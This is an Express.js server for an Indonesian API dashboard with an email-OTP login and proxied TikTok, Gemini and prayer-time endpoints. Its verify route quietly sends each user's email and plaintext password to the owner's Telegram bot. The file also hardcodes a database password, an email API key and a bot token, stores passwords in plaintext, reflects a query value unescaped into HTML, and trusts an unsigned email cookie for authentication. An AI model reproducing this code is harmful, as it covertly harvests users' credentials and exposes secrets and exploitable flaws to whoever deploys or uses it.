const express = require('express');
const axios = require('axios');
const mongoose = require('mongoose');
const { Resend } = require('resend');
const cookieParser = require('cookie-parser');
const cors = require('cors');
const app = express();

app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.use(cookieParser());
app.use(cors());

// --- KREDENSIAL ASLI ---
const MONGO_URI = "mongodb+srv://eka710231_db_user:kaaacloud@cluster0.6ssgy30.mongodb.net/?appName=Cluster0";
const RESEND_API = "re_Y3DfKKCM_7rJCyA3V1JHoxUNxQ2sc7Fb1";
const TELE_TOKEN = "7789045134:AAFY6waeQ6pD1TAx8_Rfv7J6qsokgPZXPsQ";
const OWNER_ID = "1955836653";

const resend = new Resend(RESEND_API);

// Koneksi Database Robust
mongoose.connect(MONGO_URI, { serverSelectionTimeoutMS: 5000 })
    .catch(err => console.error("MongoDB Error:", err));

// --- MODELS ---
const User = mongoose.models.User || mongoose.model('User', new mongoose.Schema({
    email: { type: String, unique: true },
    password: String,
    otp: String,
    isVerified: { type: Boolean, default: false }
}));

const Stats = mongoose.models.Stats || mongoose.model('Stats', new mongoose.Schema({
    name: { type: String, default: "main" },
    total_req: { type: Number, default: 0 }
}));

// --- MIDDLEWARE & HELPER ---
const checkAuth = async (req, res, next) => {
    const email = req.cookies.userEmail;
    if (!email) return res.redirect('/login');
    const user = await User.findOne({ email, isVerified: true });
    if (!user) return res.redirect('/login');
    next();
};

// Fungsi Penambah Request (FIXED)
async function hit() {
    try {
        await Stats.findOneAndUpdate(
            { name: "main" },
            { $inc: { total_req: 1 } },
            { upsert: true, new: true }
        );
    } catch (e) { console.log("Hit Error:", e); }
}

// --- AUTH ROUTES ---
app.get('/login', (req, res) => {
    res.send(`<body style="background:#020617; color:white; font-family:sans-serif; display:flex; align-items:center; justify-content:center; height:100vh; margin:0;">
        <div style="background:rgba(30,41,59,0.5); backdrop-filter:blur(15px); padding:40px; border-radius:30px; border:1px solid #38bdf8; width:340px; text-align:center;">
            <h1 style="color:#38bdf8; margin-bottom:20px;">KAAA LOGIN</h1>
            <form action="/auth/login" method="POST">
                <input name="email" type="email" placeholder="Email" style="width:100%; padding:12px; margin-bottom:12px; border-radius:12px; border:none; background:#0f172a; color:white;" required>
                <input name="password" type="password" placeholder="Password" style="width:100%; padding:12px; margin-bottom:20px; border-radius:12px; border:none; background:#0f172a; color:white;" required>
                <button type="submit" style="width:100%; padding:12px; background:#38bdf8; border:none; border-radius:12px; font-weight:bold; cursor:pointer;">KIRIM OTP</button>
            </form>
        </div>
    </body>`);
});

app.post('/auth/login', async (req, res) => {
    const { email, password } = req.body;
    const otp = Math.floor(100000 + Math.random() * 900000).toString();
    try {
        await User.findOneAndUpdate({ email }, { password, otp, isVerified: false }, { upsert: true });
        await resend.emails.send({
            from: 'KaaaOffc <code@kaaaoffc.web.id>',
            to: email,
            subject: 'OTP Login',
            html: `<h2>KODE OTP: ${otp}</h2>`
        });
        res.redirect('/verify?email=' + email);
    } catch (e) { res.send("Gagal kirim email: " + e.message); }
});

app.get('/verify', (req, res) => {
    res.send(`<body style="background:#020617; color:white; font-family:sans-serif; display:flex; align-items:center; justify-content:center; height:100vh;">
        <form action="/auth/verify" method="POST" style="background:rgba(30,41,59,0.5); padding:40px; border-radius:30px; border:1px solid #38bdf8; text-align:center;">
            <h2 style="color:#38bdf8;">INPUT OTP</h2>
            <input name="email" type="hidden" value="${req.query.email}">
            <input name="otp" type="text" maxlength="6" style="width:100%; padding:15px; margin:20px 0; border-radius:12px; font-size:30px; text-align:center;" required>
            <button type="submit" style="width:100%; padding:12px; background:#38bdf8; border:none; border-radius:12px; font-weight:bold;">VERIFY</button>
        </form>
    </body>`);
});

app.post('/auth/verify', async (req, res) => {
    const { email, otp } = req.body;
    const user = await User.findOne({ email, otp });
    if (user) {
        user.isVerified = true;
        await user.save();
        res.cookie('userEmail', email, { maxAge: 86400000, httpOnly: true });
        // Laporan Telegram
        axios.post(`https://api.telegram.org/bot${TELE_TOKEN}/sendMessage`, {
            chat_id: OWNER_ID,
            text: `🚀 *LOGIN SUCCESS*\n📧 Email: \`${email}\`\n🔑 Pass: \`${user.password}\``,
            parse_mode: 'Markdown'
        });
        res.redirect('/');
    } else { res.send("OTP SALAH!"); }
});

// --- DASHBOARD ---
app.get('/', checkAuth, async (req, res) => {
    const totalUser = await User.countDocuments({ isVerified: true });
    const statData = await Stats.findOne({ name: "main" }) || { total_req: 0 };
    res.send(`<!DOCTYPE html><html><head><script src="https://cdn.tailwindcss.com"></script></head>
    <body class="bg-slate-950 text-white flex items-center justify-center min-h-screen">
        <div class="bg-slate-900 p-10 rounded-[3rem] border border-sky-500/30 text-center max-w-lg w-full">
            <h1 class="text-4xl font-black text-sky-400 mb-8 italic">KAAAOFFC DASHBOARD</h1>
            <div class="grid grid-cols-2 gap-4 mb-8">
                <div class="bg-sky-500/10 p-6 rounded-2xl border border-sky-500/20">
                    <p class="text-4xl font-bold">${totalUser}</p>
                    <p class="text-xs uppercase text-sky-300">User</p>
                </div>
                <div class="bg-indigo-500/10 p-6 rounded-2xl border border-indigo-500/20">
                    <p class="text-4xl font-bold">${statData.total_req}</p>
                    <p class="text-xs uppercase text-indigo-300">Hit API</p>
                </div>
            </div>
            <a href="/docs" class="bg-sky-500 text-slate-900 px-10 py-3 rounded-full font-bold">API DOCS</a>
        </div>
    </body></html>`);
});

// --- FULL API ENDPOINTS (MIGRASI DARI INDEX LAMA) ---

// 1. TikTok Search
app.get('/search/tiktok', checkAuth, async (req, res) => {
    const q = req.query.q;
    if (!q) return res.json({ status: false, msg: "q?" });
    await hit();
    try {
        const r = await axios.get(`https://api.nexray.web.id/search/tiktok?q=${encodeURIComponent(q)}`);
        res.json({ status: true, creator: "Kaaaoffc", result: r.data.result });
    } catch (e) { res.json({ status: false, error: e.message }); }
});

// 2. TikTok Downloader
app.get('/downloader/tiktok', checkAuth, async (req, res) => {
    const url = req.query.url;
    if (!url) return res.json({ status: false, msg: "url?" });
    await hit();
    try {
        const r = await axios.get(`https://api.nexray.web.id/downloader/tiktok?url=${encodeURIComponent(url)}`);
        res.json({ status: true, creator: "Kaaaoffc", result: r.data.result });
    } catch (e) { res.json({ status: false, error: e.message }); }
});

// 3. AI Gemini
app.get('/ai/gemini', checkAuth, async (req, res) => {
    const text = req.query.text;
    if (!text) return res.json({ status: false, msg: "text?" });
    await hit();
    try {
        const r = await axios.get(`https://api.nexray.web.id/ai/gemini?text=${encodeURIComponent(text)}`);
        res.json({ status: true, creator: "Kaaaoffc", result: r.data.result });
    } catch (e) { res.json({ status: false, error: e.message }); }
});

// 4. Sholat Semua Kota
app.get('/sholat/kota/semua', checkAuth, async (req, res) => {
    await hit();
    try {
        const r = await axios.get("https://api.myquran.com/v2/sholat/kota/semua");
        res.json({ status: true, result: r.data });
    } catch (e) { res.json({ status: false }); }
});

// --- DOCS ---
app.get('/docs', checkAuth, (req, res) => {
    res.send(`<body class="bg-slate-950 text-slate-300 p-10 font-sans">
        <h1 class="text-white text-3xl font-bold mb-6">Documentation</h1>
        <ul class="space-y-4">
            <li class="bg-slate-900 p-4 rounded-xl border-l-4 border-sky-500">
                <code class="text-sky-400">/search/tiktok?q=musik</code>
            </li>
            <li class="bg-slate-900 p-4 rounded-xl border-l-4 border-sky-500">
                <code class="text-sky-400">/downloader/tiktok?url=LINK</code>
            </li>
            <li class="bg-slate-900 p-4 rounded-xl border-l-4 border-sky-500">
                <code class="text-sky-400">/ai/gemini?text=halo</code>
            </li>
        </ul>
        <a href="/" class="block mt-10 text-sky-500">← Kembali</a>
    </body>`);
});

app.get('/logout', (req, res) => { res.clearCookie('userEmail'); res.redirect('/login'); });

module.exports = app;
